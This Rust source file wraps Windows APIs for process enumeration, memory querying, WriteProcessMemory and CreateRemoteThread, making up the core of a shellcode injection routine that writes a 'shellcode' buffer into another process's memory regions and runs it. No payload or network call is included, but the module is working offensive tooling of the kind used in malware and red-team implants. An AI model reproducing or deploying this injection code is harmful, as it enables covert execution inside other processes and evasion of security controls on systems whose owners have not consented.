use std::error::Error;
use std::ffi::c_void;
use std::mem;

use windows::core::PSTR;
use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

use windows::Win32::System::Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, QueryFullProcessImageNameA, PROCESS_NAME_FORMAT,
};
use windows::Win32::System::Threading::{IsWow64Process, PROCESS_ACCESS_RIGHTS};

#[allow(clippy::upper_case_acronyms)]
type LPVOID = *mut c_void;
#[allow(clippy::upper_case_acronyms)]
type DWORD = u32;
const MAXIMUM_ALLOWED: DWORD = 33554432;

pub fn create_toolhelp32_snapshot() -> Result<HANDLE, Box<dyn Error>> {
    unsafe { Ok(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?) }
}

pub fn process32_first(
    snapshot: HANDLE,
    process_entry: &mut PROCESSENTRY32,
) -> Result<(), Box<dyn Error>> {
    unsafe { Ok(Process32First(snapshot, &mut *process_entry)?) }
}

pub fn process32_next(
    snapshot: HANDLE,
    process_entry: &mut PROCESSENTRY32,
) -> Result<(), Box<dyn Error>> {
    unsafe { Ok(Process32Next(snapshot, &mut *process_entry)?) }
}

pub fn open_process(th32_process_id: u32) -> Result<HANDLE, Box<dyn Error>> {
    unsafe {
        Ok(OpenProcess(
            PROCESS_ACCESS_RIGHTS(MAXIMUM_ALLOWED),
            false,
            th32_process_id,
        )?)
    }
}

pub fn is_wow64_process(process: HANDLE) -> Result<bool, Box<dyn Error>> {
    let mut is_x64: BOOL = BOOL::default();
    unsafe {
        IsWow64Process(process, &mut is_x64)?;
    }
    Ok(is_x64.as_bool())
}

pub fn query_full_process_image_name_a(process: HANDLE) -> Result<String, Box<dyn Error>> {
    let mut array: [u8; 261] = [0; 261]; // max path lenght windows
    let lp_exe_name: PSTR = PSTR::from_raw(array.as_mut_ptr());
    let mut lpdw_size: u32 = array.len() as u32;
    unsafe {
        QueryFullProcessImageNameA(process, PROCESS_NAME_FORMAT(0), lp_exe_name, &mut lpdw_size)
            .unwrap()
    }
    Ok(unsafe { lp_exe_name.to_string().unwrap() })
}

pub fn virtual_query_ex(
    process: HANDLE,
    offset: LPVOID,
    mbi: &mut MEMORY_BASIC_INFORMATION,
) -> usize {
    unsafe { VirtualQueryEx(process, Some(offset), mbi, mem::size_of_val(mbi)) }
}

pub fn write_process_memory(
    process: HANDLE,
    mbi: MEMORY_BASIC_INFORMATION,
    shellcode: &[u8],
) -> Result<usize, Box<dyn Error>> {
    let mut bytes_written: usize = 0;
    unsafe {
        WriteProcessMemory(
            process,
            mbi.BaseAddress,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            Some(&mut bytes_written),
        )?
    }
    Ok(bytes_written)
}

pub fn create_remote_thread(
    process: HANDLE,
    mbi: MEMORY_BASIC_INFORMATION,
) -> Result<HANDLE, Box<dyn Error>> {
    unsafe {
        Ok(CreateRemoteThread(
            process,
            None,
            0,
            Some(*(&mbi.BaseAddress as *const _ as *const extern "system" fn(LPVOID) -> u32)),
            None,
            0,
            None,
        )?)
    }
}

pub fn close_handle(process: HANDLE) -> Result<(), Box<dyn Error>> {
    unsafe { Ok(CloseHandle(process)?) }
}
